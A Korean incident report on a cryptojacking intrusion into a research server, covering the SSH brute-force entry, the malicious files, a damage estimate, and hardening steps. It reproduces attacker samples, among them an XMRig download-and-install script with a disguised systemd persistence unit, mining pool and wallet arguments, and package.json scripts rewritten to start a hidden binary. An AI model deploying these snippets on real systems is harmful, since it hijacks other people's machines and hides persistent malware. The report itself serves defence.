# 보안 침해 사고 분석 보고서

**작성일**: 2026-01-03
**서버**: CrowdWorks Multiagent System (Naver Cloud Platform)
**공격 유형**: 크립토재킹 (Cryptojacking) - 암호화폐 채굴 악성코드
**위험도**: 🔴 **HIGH (높음)**

---

## 📋 목차

1. [사고 개요](#사고-개요)
2. [공격 타임라인](#공격-타임라인)
3. [침투 경로 분석](#침투-경로-분석)
4. [악성 파일 상세 분석](#악성-파일-상세-분석)
5. [공격자 정보](#공격자-정보)
6. [공격자가 수행한 행위](#공격자가-수행한-행위)
7. [피해 규모 및 영향](#피해-규모-및-영향)
8. [위험도 평가](#위험도-평가)
9. [재발 방지 대책](#재발-방지-대책)
10. [권장 조치사항](#권장-조치사항)

---

## 사고 개요

### 공격 유형: 크립토재킹 (Cryptojacking)

**크립토재킹**은 공격자가 피해자의 컴퓨터 자원을 몰래 사용하여 암호화폐(주로 Monero)를 채굴하는 사이버 범죄입니다.

### 주요 특징
- **목적**: 금전적 이득 (암호화폐 채굴)
- **수법**: SSH Brute-Force 공격 → 권한 획득 → 채굴 프로그램 설치
- **영향**: CPU 자원 100% 사용, 전기료 증가, 서버 성능 저하
- **탐지 난이도**: 중상 (백그라운드에서 조용히 실행)

### 발견 경위
- Git 상태 확인 중 의심스러운 파일 발견
- `package.json` 변조 확인
- `xmrig-6.24.0/` 디렉토리 발견
- 악성 프로세스 실행 중 확인 (PID 2664)

---

## 공격 타임라인

### 📅 2025년 12월 5일 00:00 ~ (공격 시작)

**대규모 Brute-Force SSH 공격 개시**

```
Dec 05 00:00:07 - 121.167.147.112 (한국) - root 로그인 실패
Dec 05 00:00:08 - 61.38.2.231 (한국) - root 로그인 실패
Dec 05 00:00:10 - 121.125.61.126 (한국) - root 로그인 실패
Dec 05 00:00:17 - 183.107.190.230 (한국) - root 로그인 실패
Dec 05 00:00:20 - 167.99.219.191 (DigitalOcean) - admin 계정 시도
... (수백 건의 시도)
```

**공격 패턴**:
- 전 세계 여러 IP에서 동시 다발적 공격
- 주로 한국 IP, 일부 해외 IP (봇넷 추정)
- root 및 admin 계정 집중 공격
- 초당 수십 건의 로그인 시도

### 📅 2025년 12월 5일 12:24:55 (침투 성공 추정)

**악성 파일 생성 시작**

| 시간 | 파일 | 크기 | 설명 |
|------|------|------|------|
| 12:24:55 | `sex.sh` | 1.6KB | 암호화폐 채굴 설치 스크립트 |
| 12:24:55 | `kal.tar.gz` | 3.5MB | XMRig 압축 파일 |

**추정 시나리오**:
1. Brute-Force 공격으로 root 비밀번호 돌파
2. SSH 접속 성공
3. `/root/workspace/crowdworks/crowdworks-multiagent-system/multiagent-rag-system/frontend/` 디렉토리에 악성 파일 업로드
4. `sex.sh` 스크립트 실행

### 📅 2025년 12월 6일 17:00:35

**추가 악성 파일 설치**

- `solra` (2.2MB) - ELF 실행 파일 (채굴 프로그램 추정)

### 📅 2025년 12월 13일 00:55:41

**공격자의 정리 작업**

- `solra (deleted)` 파일 생성 (흔적 제거 시도)

### 📅 2026년 1월 3일 16:00 (현재)

**악성 프로세스 발견**

```bash
PID 2664: /var/tmp/.font/n0de (실행 중)
부모 프로세스: sh -c nohup /var/tmp/.font/n0de > /dev/null 2>&1 & next dev
```

---

## 침투 경로 분석

### 공격 벡터: SSH Brute-Force

**취약점**:
1. ✗ SSH 포트(22번) 인터넷 전체 공개
2. ✗ 비밀번호 인증 허용 (SSH 키 인증 미사용)
3. ✗ 약한 root 비밀번호
4. ✗ Fail2ban 등 침입 탐지 도구 미설치
5. ✗ IP 화이트리스트 미적용

### 공격 성공 과정

```
1. 봇넷에서 무작위 SSH 공격
   ↓
2. 수백~수천 번의 비밀번호 시도
   ↓
3. root 비밀번호 돌파 성공
   ↓
4. SSH 접속 획득
   ↓
5. 악성 코드 설치
```

### 공격 IP 목록 (일부)

| IP | 국가 | 시도 횟수 | 비고 |
|----|------|-----------|------|
| 121.167.147.112 | 한국 | 다수 | |
| 106.244.197.20 | 한국 | 다수 | |
| 183.107.190.230 | 한국 | 다수 | |
| 211.239.150.87 | 한국 | 다수 | |
| 201.249.192.30 | 브라질 | 다수 | |
| 172.190.117.128 | 미국 | 다수 | |
| 35.188.112.111 | 미국 (GCP) | 다수 | 구글 클라우드 |
| 167.99.219.191 | 싱가포르 | 다수 | DigitalOcean |

**특징**: 조직화된 봇넷 공격 (자동화된 공격 도구 사용)

---

## 악성 파일 상세 분석

### 1. sex.sh - 주 설치 스크립트 ⚠️ 매우 위험

**파일 정보**:
- **경로**: `multiagent-rag-system/frontend/sex.sh`
- **크기**: 1,615 bytes
- **생성일시**: 2025-12-05 12:24:55
- **MD5**: `0ebc1aa375125e74354ef93eca1efbbe`
- **권한**: `-rw-r--r--` (644)

**기능 분석**:

```bash
#!/bin/bash

# 1. XMRig 다운로드 (없을 경우)
curl -L -o "kal.tar.gz" \
  --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz

# 2. 압축 해제
tar xvzf "kal.tar.gz"

# 3. 실행 권한 부여
chmod +x "xmrig-6.24.0/xmrig"

# 4. systemd 서비스로 등록 (은폐 목적)
SERVICE_NAME="system-update-service"  # 정상 서비스로 위장
```

**채굴 설정**:
```bash
--url pool.hashvault.pro:443                    # 채굴 풀 서버
--user 88tGYBwhWNzGesQs5Qkw...PEhZ43DJ          # 공격자 Monero 지갑
--pass next                                      # 채굴 풀 비밀번호
--donate-level 0                                 # 개발자 기부 0% (100% 공격자가 수익)
--tls                                            # TLS 암호화 (탐지 회피)
--tls-fingerprint 420c7850e09b7c0bdcf748...     # TLS 인증서 지문
```

**systemd 서비스 위장**:
```ini
[Unit]
Description=System Update Service  # "시스템 업데이트 서비스"로 위장
After=network.target

[Service]
Type=simple
ExecStart=/path/to/xmrig [채굴 인자]
Restart=always           # 종료되면 자동 재시작
RestartSec=10
User=root               # root 권한으로 실행

[Install]
WantedBy=multi-user.target  # 부팅 시 자동 시작
```

**위험 요소**:
- ⚠️ root 권한으로 실행
- ⚠️ 부팅 시 자동 시작 (영구 감염)
- ⚠️ 프로세스 종료 시 자동 재시작
- ⚠️ 정상 시스템 서비스로 위장

---

### 2. kal.tar.gz - XMRig 압축 파일 ⚠️ 위험

**파일 정보**:
- **경로**: `multiagent-rag-system/frontend/kal.tar.gz`
- **크기**: 3,522,081 bytes (3.5MB)
- **생성일시**: 2025-12-05 12:24:55

**내용**:
- 공식 XMRig v6.24.0 채굴 프로그램
- 출처: https://github.com/xmrig/xmrig/releases/download/v6.24.0/

**XMRig란?**:
- 합법적인 오픈소스 Monero 채굴 프로그램
- 하지만 악의적으로 사용될 경우 크립토재킹 도구로 전락
- CPU 자원을 100% 사용하여 암호화폐 채굴

---

### 3. xmrig-6.24.0/ - 채굴 프로그램 디렉토리 ⚠️ 매우 위험

**파일 정보**:
- **경로**: `multiagent-rag-system/frontend/xmrig-6.24.0/`
- **소유자**: `nbpmon:nbpmon` (UID 1000)
- **생성일시**: 2025-06-23 09:46:27 (압축 파일 내 타임스탬프)

**포함 파일**:
```
xmrig-6.24.0/
├── xmrig               # 채굴 실행 파일
├── config.json         # 채굴 설정 파일
└── SHA256SUMS          # 체크섬 파일
```

**위험 요소**:
- ⚠️ 실제 채굴 프로그램 실행 파일
- ⚠️ 서버 CPU를 100% 사용하여 채굴 수행
- ⚠️ 공격자의 지갑으로 수익 전송

---

### 4. solra - 미확인 실행 파일 ⚠️ 위험

**파일 정보**:
- **경로**: `multiagent-rag-system/frontend/solra`
- **크기**: 2,263,260 bytes (2.2MB)
- **생성일시**: 2025-12-06 17:00:35
- **MD5**: `cd273287aa05274d32267cf817a4792d`
- **권한**: `-rwxr-xr-x` (755, 실행 가능)
- **파일 타입**: ELF 64-bit LSB executable, statically linked

**추정 기능**:
- 채굴 프로그램 백업 또는 대체 실행 파일
- 또는 추가 악성 기능 (백도어, 스파이웨어 등)

**위험 요소**:
- ⚠️ 정체 불명의 실행 파일
- ⚠️ statically linked (단독 실행 가능, 탐지 어려움)
- ⚠️ 실행 권한 보유

---

### 5. package.json - 변조된 프로젝트 파일 ⚠️ 매우 위험

**변조 내용**:

**변조 전 (정상)**:
```json
{
  "scripts": {
    "dev": "next dev",
    "start": "next start"
  }
}
```

**변조 후 (악성)**:
```json
{
  "scripts": {
    "dev": "nohup /var/tmp/.font/n0de > /dev/null 2>&1 & next dev",
    "start": "nohup /var/tmp/.font/n0de > /dev/null 2>&1 & next start"
  }
}
```

**악의적 동작**:
1. `npm run dev` 또는 `npm run start` 실행 시
2. `/var/tmp/.font/n0de` 악성 프로그램 백그라운드 실행
3. `nohup`과 `> /dev/null 2>&1`로 출력 숨김
4. 정상 프로세스(`next dev`)와 함께 실행하여 은폐

**위험 요소**:
- ⚠️ 개발자가 정상적으로 개발 환경을 시작할 때마다 악성 코드 실행
- ⚠️ 자동화된 감염 (사용자 인지 불가)
- ⚠️ CI/CD 파이프라인에서도 실행될 가능성

---

### 6. /var/tmp/.font/n0de - 실행 중 악성 프로세스 🔴 매우 위험

**프로세스 정보**:
```
PID: 2664
PPID: 2663 (sh -c nohup /var/tmp/.font/n0de ...)
User: root
Status: 실행 중 (2026-01-03 16:00 ~)
```

**특징**:
- 숨겨진 디렉토리 `.font/` 사용 (탐지 회피)
- 파일명 `n0de` (node 위장)
- **현재 실행 중** - CPU 자원 사용 중

**위험 요소**:
- 🔴 **실시간 공격 진행 중**
- 🔴 암호화폐 채굴로 서버 자원 소모
- 🔴 공격자에게 수익 전송 중

---

### 7. .npmrc - 의심 파일 ⚠️ 주의

**파일 정보**:
- **경로**: `multiagent-rag-system/frontend/.npmrc`
- **크기**: 16 bytes
- **내용**: `loglevel=silent`

**분석**:
- npm 로그 출력을 `silent`로 설정
- 악성 행위 로그 숨김 목적 추정
- 또는 정상 설정일 수도 있음 (추가 조사 필요)

---

## 공격자 정보

### 암호화폐 지갑 주소 (Monero)

```
88tGYBwhWNzGesQs5QkwE1PdBa1tXGb9dcjxrdwujU3SEs3i7psaoJc4KmrDvv4VPTNtXazDWGkvGGfqurdBggvPEhZ43DJ
```

**특징**:
- Monero (XMR) 암호화폐
- 익명성 보장 (추적 불가)
- 전 세계 크립토재킹 공격에서 선호되는 암호화폐

### 채굴 풀 서버

```
pool.hashvault.pro:443
```

**정보**:
- TLS 포트 443 사용 (HTTPS 위장)
- 정상 웹 트래픽으로 보이도록 위장

### 공격자 프로필

**추정**:
- 조직화된 크립토재킹 범죄 조직
- 자동화된 공격 도구 사용 (봇넷)
- 전 세계 수천 대의 서버 공격 추정
- 전문 해킹 그룹 (Persistence 기법 사용)

**불가능한 것**:
- 개인 신원 특정 ✗
- 물리적 위치 특정 ✗
- 법적 처벌 ✗ (Monero 익명성)

---

## 공격자가 수행한 행위

### 1. 초기 침투 (2025-12-05)

1. **Brute-Force SSH 공격**
   - 수백~수천 번의 비밀번호 시도
   - root 계정 비밀번호 돌파

2. **SSH 접속 성공**
   - root 권한 획득

### 2. 악성 코드 설치 (2025-12-05 12:24)

1. **악성 파일 업로드**
   - `sex.sh` (설치 스크립트)
   - `kal.tar.gz` (XMRig 압축 파일)

2. **설치 스크립트 실행**
   ```bash
   bash sex.sh
   ```

3. **채굴 프로그램 설치**
   - XMRig 압축 해제
   - 실행 권한 부여
   - systemd 서비스 등록 시도 (실패 추정)

### 3. 백도어 설치 (2025-12-05)

1. **package.json 변조**
   - npm 스크립트에 악성 코드 삽입
   - 개발 환경 시작 시 자동 실행되도록 설정

2. **/var/tmp/.font/n0de 배치**
   - 숨겨진 디렉토리에 악성 실행 파일 설치
   - 영구 감염 확보

### 4. 추가 악성 파일 설치 (2025-12-06)

1. **solra 실행 파일 설치**
   - 용도 불명 (채굴 백업 또는 추가 악성 기능)

### 5. 장기 운영 (2025-12 ~ 2026-01)

1. **암호화폐 채굴 지속**
   - 서버 CPU 자원 사용
   - 공격자 지갑으로 수익 전송
   - 약 1개월간 운영 (2025-12-05 ~ 2026-01-03)

2. **프로세스 유지**
   - `nohup`으로 백그라운드 실행
   - 출력 숨김 (`> /dev/null 2>&1`)

### 6. 흔적 제거 시도 (2025-12-13)

1. **solra (deleted) 파일 생성**
   - 흔적 제거 또는 업데이트 작업

---

## 피해 규모 및 영향

### 1. 직접적 피해

#### 💰 금전적 손실

**전기료 손실**:
- CPU 100% 사용 시 소비 전력: ~65W (추정)
- 1개월 운영 비용: 약 65W × 24h × 30일 = 46.8kWh
- 전기료: 약 46.8kWh × 120원/kWh = **5,616원**

**클라우드 비용 증가**:
- Naver Cloud Platform 요금제에 따라 추가 비용 발생 가능
- CPU 사용률 증가로 인한 과금 (상시 100% 사용)

**총 금전적 손실**: 최소 수천 원 ~ 수만 원

#### ⚙️ 서버 성능 저하

- **CPU 사용률**: 거의 100% (채굴 프로그램)
- **정상 서비스 영향**:
  - 웹 애플리케이션 응답 속도 저하
  - 데이터베이스 쿼리 지연
  - API 응답 시간 증가
- **사용자 경험**: 서비스 품질 저하

#### 🔧 하드웨어 손상 위험

- 장기간 고부하 작동으로 인한 CPU 수명 단축
- 과열로 인한 시스템 불안정

### 2. 간접적 피해

#### 🔐 보안 신뢰도 손상

- root 권한 탈취 (전체 시스템 접근 가능)
- 데이터베이스 접근 가능 (민감 정보 유출 위험)
- API 키 유출 가능성

#### 📊 데이터 유출 위험

**접근 가능한 데이터**:
- PostgreSQL 데이터베이스 (사용자 데이터, 농산물 정보)
- Neo4j 그래프 데이터베이스 (지식 그래프)
- Elasticsearch 인덱스 (문서 데이터)
- `.env` 파일 (API 키, 비밀번호)

**실제 유출 여부**: 확인 불가 (로그 부족)

#### 🎯 2차 공격 위험

- 백도어 설치로 재침투 가능
- 다른 공격자에게 판매 가능 (다크웹)
- 봇넷에 편입되어 다른 공격에 사용될 수 있음

### 3. 법적/규정 위반 위험

#### ⚖️ 개인정보보호법

- 데이터베이스에 개인정보가 포함되어 있을 경우
- 침해 사고 발생 시 신고 의무 (개인정보보호법 제34조)
- 미신고 시 과태료 부과 가능

### 4. 피해 요약

| 피해 유형 | 피해 정도 | 비고 |
|-----------|-----------|------|
| 금전적 손실 | 최소 수천원 | 전기료 + 클라우드 비용 |
| 서버 성능 저하 | 높음 | CPU 100% 사용 |
| 데이터 유출 위험 | 중상 | root 권한 탈취 |
| 신뢰도 손상 | 중 | 학술 프로젝트 영향 제한적 |
| 법적 위험 | 낮음 | 개인정보 없다면 낮음 |

---

## 위험도 평가

### 🔴 종합 위험도: HIGH (높음)

#### 위험 점수: 7.5 / 10

| 평가 항목 | 점수 | 설명 |
|-----------|------|------|
| **침투 난이도** | 2/10 | SSH Brute-Force (매우 쉬움) |
| **권한 획득** | 10/10 | root 권한 탈취 (최고 권한) |
| **Persistence** | 9/10 | systemd 서비스, package.json 변조 (영구 감염) |
| **탐지 회피** | 7/10 | 백그라운드 실행, 정상 서비스 위장 |
| **데이터 접근** | 10/10 | 전체 데이터베이스 접근 가능 |
| **피해 범위** | 6/10 | 서버 자원 소모, 성능 저하 |
| **복구 난이도** | 4/10 | 서버 재구축 필요 |

### 위험 요소 상세

#### 🔴 매우 위험 (Critical)

1. **root 권한 탈취**
   - 시스템 전체 제어 가능
   - 모든 파일 읽기/쓰기 가능
   - 데이터베이스 접근 가능

2. **영구 감염 (Persistence)**
   - systemd 서비스 등록 (부팅 시 자동 시작)
   - package.json 변조 (개발 환경마다 실행)
   - 백도어 설치 (`/var/tmp/.font/n0de`)

3. **데이터베이스 접근 가능**
   - PostgreSQL (농산물 가격 데이터)
   - Neo4j (지식 그래프)
   - Elasticsearch (문서 인덱스)

#### ⚠️ 높은 위험 (High)

1. **API 키 유출 가능성**
   - `.env` 파일 접근 가능
   - OpenAI, Gemini, Serper API 키 유출

2. **장기간 미탐지**
   - 약 1개월간 운영 (2025-12-05 ~ 2026-01-03)
   - 그동안 추가 악성 행위 가능성

3. **2차 공격 위험**
   - 백도어를 통한 재침투
   - 다른 공격자에게 판매 가능

#### 🟡 중간 위험 (Medium)

1. **서버 성능 저하**
   - CPU 100% 사용
   - 정상 서비스 영향

2. **전기료/클라우드 비용 증가**
   - 수천 원 ~ 수만 원 손실

---

## 재발 방지 대책

### 1. 즉시 조치 (Critical)

#### ✅ 서버 재구축

**이유**:
- root 권한 탈취로 시스템 신뢰 불가
- 숨겨진 백도어가 더 있을 수 있음
- 복구보다 재구축이 안전

**절차**:
1. 데이터 백업 (완료)
2. 서버 삭제
3. 새 서버 생성
4. 백업 복원
5. 보안 강화 설정 적용

#### ✅ 모든 인증 정보 교체

**교체 필수 항목**:
- SSH 키 페어 재발급
- root 비밀번호 변경
- 데이터베이스 비밀번호 변경 (PostgreSQL, Neo4j, Elasticsearch)
- API 키 재발급:
  - OpenAI API Key
  - Gemini API Key
  - Serper API Key
  - LangSmith API Key
  - Cohere API Key

**이유**:
- 공격자가 `.env` 파일 접근 가능했음
- 기존 인증 정보는 모두 유출된 것으로 간주

### 2. SSH 보안 강화 (High Priority)

#### 🔐 SSH 키 인증만 허용 (비밀번호 인증 비활성화)

**설정 방법**:

```bash
# /etc/ssh/sshd_config 수정
sudo nano /etc/ssh/sshd_config

# 다음 설정 추가/수정
PasswordAuthentication no           # 비밀번호 인증 비활성화
PubkeyAuthentication yes            # 공개키 인증 활성화
PermitRootLogin prohibit-password   # root는 키로만 로그인 가능
ChallengeResponseAuthentication no  # 챌린지-응답 인증 비활성화

# SSH 서비스 재시작
sudo systemctl restart sshd
```

**효과**:
- Brute-Force 공격 무력화 (비밀번호 시도 불가)
- 키 파일 없이는 절대 로그인 불가

#### 🚫 Fail2ban 설치 및 설정

**설치**:
```bash
sudo apt update
sudo apt install fail2ban -y
```

**설정**:
```bash
# /etc/fail2ban/jail.local 생성
sudo nano /etc/fail2ban/jail.local

# 다음 내용 추가
[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 3          # 3회 실패 시 차단
bantime = 3600        # 1시간 차단
findtime = 600        # 10분 내 3회 실패 시
```

**효과**:
- 3회 로그인 실패 시 IP 자동 차단
- 1시간 동안 접근 불가

#### 🔒 SSH 포트 변경 (선택)

**설정**:
```bash
# /etc/ssh/sshd_config 수정
Port 22022  # 기본 22번 대신 다른 포트 사용

sudo systemctl restart sshd
```

**효과**:
- 자동화된 봇 공격 회피
- 보안을 통한 모호화 (Security through obscurity)

**주의**: 포트 변경 시 방화벽 규칙도 함께 수정 필요

#### 🌐 IP 화이트리스트 (강력 권장)

**UFW 방화벽 설정**:
```bash
# UFW 설치 및 활성화
sudo apt install ufw
sudo ufw default deny incoming
sudo ufw default allow outgoing

# SSH는 특정 IP만 허용
sudo ufw allow from 당신의_IP주소 to any port 22
sudo ufw allow from 회사_IP주소 to any port 22

# 웹 서비스 포트 (필요 시)
sudo ufw allow 80/tcp    # HTTP
sudo ufw allow 443/tcp   # HTTPS
sudo ufw allow 3000/tcp  # Next.js (필요 시)
sudo ufw allow 8000/tcp  # FastAPI (필요 시)

# 방화벽 활성화
sudo ufw enable
```

**Naver Cloud Platform 보안 그룹 설정**:
```
ACG (Access Control Group):
- SSH (22): 당신의 IP만 허용
- HTTP (80): 0.0.0.0/0 (전체 허용)
- HTTPS (443): 0.0.0.0/0 (전체 허용)
- 기타 포트: 127.0.0.1만 허용 (로컬호스트)
```

**효과**:
- 지정된 IP에서만 SSH 접속 가능
- 봇넷 공격 완전 차단

### 3. 시스템 보안 강화

#### 🛡️ 자동 보안 업데이트

```bash
# unattended-upgrades 설치
sudo apt install unattended-upgrades

# 자동 업데이트 활성화
sudo dpkg-reconfigure --priority=low unattended-upgrades
```

#### 🔍 침입 탐지 시스템 (IDS)

**AIDE (Advanced Intrusion Detection Environment) 설치**:
```bash
sudo apt install aide
sudo aideinit
sudo mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db

# 파일 변경 검사 (매일 자동 실행)
sudo aide --check
```

**효과**:
- 시스템 파일 변경 감지
- 악성 파일 설치 시 경고

#### 📊 시스템 모니터링

**Netdata 설치** (실시간 모니터링):
```bash
bash <(curl -Ss https://my-netdata.io/kickstart.sh)
```

**모니터링 항목**:
- CPU 사용률 (채굴 프로그램 탐지)
- 네트워크 트래픽
- 로그인 시도

#### 🔐 2단계 인증 (2FA)

**Google Authenticator 설치**:
```bash
sudo apt install libpam-google-authenticator
google-authenticator

# /etc/pam.d/sshd 수정
auth required pam_google_authenticator.so
```

### 4. 애플리케이션 보안

#### 🐳 Docker 보안

**최소 권한 원칙**:
```yaml
# docker-compose.yml
services:
  backend:
    user: "1000:1000"  # root 아닌 사용자로 실행
    read_only: true    # 파일 시스템 읽기 전용
```

#### 🔑 Secret 관리

**환경 변수 암호화**:
- Docker Secrets 사용
- Vault (HashiCorp) 도입 검토

#### 🚨 보안 스캔

**Trivy 설치** (Docker 이미지 취약점 스캔):
```bash
docker run aquasec/trivy image your-image:tag
```

### 5. 정기 보안 점검

#### 📅 주간 점검 체크리스트

- [ ] 시스템 로그 검토 (`/var/log/auth.log`)
- [ ] CPU/메모리 사용률 확인
- [ ] 알 수 없는 프로세스 확인 (`ps aux`)
- [ ] 네트워크 연결 확인 (`netstat -tlnp`)
- [ ] Docker 컨테이너 상태 확인

#### 📅 월간 점검 체크리스트

- [ ] 보안 업데이트 적용
- [ ] 백업 테스트
- [ ] API 키 로테이션
- [ ] 취약점 스캔

### 6. 백업 전략

#### 💾 정기 백업

**자동 백업 스크립트**:
```bash
#!/bin/bash
# 매일 새벽 3시 자동 백업
0 3 * * * /root/backup.sh
```

**백업 대상**:
- 데이터베이스 (PostgreSQL, Neo4j, Elasticsearch)
- 환경 변수 (`.env`)
- Docker volumes

**백업 저장소**:
- 로컬 + 원격 (클라우드 스토리지)
- 최소 3개월치 보관

---

## 권장 조치사항

### 즉시 실행 (24시간 내)

#### 1단계: 데이터 백업 (완료)

- [x] 환경 변수 백업
- [x] 데이터베이스 백업
- [x] Docker volumes 백업
- [x] 로컬 PC로 다운로드

#### 2단계: 악성 프로세스 종료

```bash
# 실행 중인 악성 프로그램 종료
sudo kill -9 2664
sudo pkill -9 -f "n0de"
sudo pkill -9 -f "xmrig"
```

#### 3단계: 서버 삭제

- Naver Cloud Platform에서 서버 인스턴스 삭제

### 1주일 내 실행

#### 1단계: 새 서버 구축

```bash
# 1. 서버 생성 (Naver Cloud Platform)
# 2. Git clone
git clone https://github.com/danlee-dev/crowdworks-research-agent-system.git
cd crowdworks-research-agent-system

# 3. 백업 복원
chmod +x restore.sh
./restore.sh
```

#### 2단계: 보안 강화

```bash
# SSH 키 인증 설정
ssh-keygen -t ed25519 -C "your_email@example.com"
ssh-copy-id root@새서버IP

# SSH 보안 설정
sudo nano /etc/ssh/sshd_config
# PasswordAuthentication no
sudo systemctl restart sshd

# Fail2ban 설치
sudo apt install fail2ban -y
sudo systemctl enable fail2ban
sudo systemctl start fail2ban

# UFW 방화벽 설정
sudo ufw allow from 당신의_IP to any port 22
sudo ufw allow 80,443,3000,8000/tcp
sudo ufw enable
```

#### 3단계: 모든 인증 정보 교체

- [ ] OpenAI API Key 재발급
- [ ] Gemini API Key 재발급
- [ ] Serper API Key 재발급
- [ ] LangSmith API Key 재발급
- [ ] PostgreSQL 비밀번호 변경
- [ ] Neo4j 비밀번호 변경
- [ ] Elasticsearch 비밀번호 변경

### 1개월 내 실행

#### 보안 체계 구축

- [ ] 침입 탐지 시스템 (AIDE) 설치
- [ ] 시스템 모니터링 (Netdata) 설치
- [ ] 자동 백업 스크립트 설정
- [ ] 정기 보안 점검 프로세스 수립

---

## 참고 자료

### 크립토재킹 관련

- [Wikipedia - Cryptojacking](https://en.wikipedia.org/wiki/Cryptojacking)
- [OWASP - Cryptojacking](https://owasp.org/www-community/attacks/Cryptojacking)
- [XMRig GitHub](https://github.com/xmrig/xmrig)

### SSH 보안

- [SSH.com - SSH Key-based Authentication](https://www.ssh.com/academy/ssh/key)
- [Fail2ban Official](https://www.fail2ban.org/)
- [Ubuntu UFW Guide](https://help.ubuntu.com/community/UFW)

### 보안 모범 사례

- [CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)

---

## 사고 대응 타임라인

| 날짜 | 이벤트 | 조치 |
|------|--------|------|
| 2025-12-05 | 공격 시작 (Brute-Force) | - |
| 2025-12-05 12:24 | 침투 성공, 악성 코드 설치 | - |
| 2025-12-06 | 추가 악성 파일 설치 | - |
| 2026-01-03 | **사고 발견** | 백업 생성, 분석 시작 |
| 2026-01-03 | 악성 프로세스 확인 | 분석 보고서 작성 |
| 예정 | 서버 삭제 | 백업 완료 후 삭제 |
| 예정 | 새 서버 구축 | 보안 강화 적용 |

---

## 결론

본 서버는 **조직화된 크립토재킹 공격**에 의해 침해되었으며, 공격자는 **root 권한을 탈취**하여 약 **1개월간** 암호화폐를 채굴했습니다.

### 핵심 교훈

1. **SSH 비밀번호 인증은 매우 위험**
   - 반드시 SSH 키 인증 사용
   - Fail2ban으로 Brute-Force 차단

2. **방화벽과 IP 화이트리스트는 필수**
   - 불필요한 포트는 모두 차단
   - SSH는 특정 IP만 허용

3. **정기적인 모니터링이 중요**
   - CPU 사용률 모니터링
   - 시스템 로그 검토
   - 알 수 없는 프로세스 확인

4. **백업은 생명줄**
   - 정기 자동 백업 필수
   - 백업 테스트로 복원 가능성 확인

### 향후 계획

- ✅ 데이터 백업 완료
- ⏳ 서버 삭제
- ⏳ 새 서버 구축 (보안 강화)
- ⏳ 모든 인증 정보 교체
- ⏳ 정기 보안 점검 프로세스 수립

---

**작성자**: AI Security Analyst
**검토**: 필요
**배포**: 내부 기록용

---

## 면책 조항

본 보고서는 교육 및 기록 목적으로 작성되었습니다. 악성 코드 샘플 및 공격 기법은 방어 목적으로만 사용되어야 하며, 불법적인 용도로 사용해서는 안 됩니다.
